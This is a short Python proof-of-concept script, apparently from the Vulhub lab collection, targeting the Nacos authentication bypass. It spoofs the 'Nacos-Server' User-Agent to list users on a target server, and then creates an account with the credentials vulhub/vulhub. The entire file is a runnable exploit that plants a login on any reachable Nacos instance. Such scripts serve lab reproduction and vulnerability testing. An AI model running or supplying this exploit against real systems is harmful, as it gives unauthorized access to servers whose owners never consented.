#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import time
import requests
from requests.exceptions import ConnectionError, Timeout

headers = {
    "User-Agent": "Nacos-Server"
}

def check(target):
    endpoint = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
    url = target.strip("/") + endpoint
    retries = 3
    for i in range(retries):
        try:
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 200 and "pageItems" in r.text:
                print(f"{target} has vulnerabilities")
                return True
            print(f"{target} has not vulnerabilities")
            return False
        except (ConnectionError, Timeout) as e:
            print(f"Attempt {i + 1} failed: {e}")
            time.sleep(2)
    print("All attempts failed")
    return False

def add_user(target):
    add_user_endpoint = "/nacos/v1/auth/users?username=vulhub&password=vulhub"
    url = target.strip("/") + add_user_endpoint
    retries = 3
    for i in range(retries):
        try:
            r = requests.post(url, headers=headers, timeout=10)
            if r.status_code == 200 and "create user ok" in r.text:
                print("Add User Success")
                print("New User Info: vulhub/vulhub")
                print(f"Nacos Login Endpoint: {target}/nacos/")
                exit(1)
        except (ConnectionError, Timeout) as e:
            print(f"Attempt {i + 1} failed: {e}")
            time.sleep(2)
    print("Add User Failed")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Please specify the target: python3 poc.py http://xxxxx:8848")
        exit(-1)
    if check(sys.argv[1]):
        add_user(sys.argv[1])
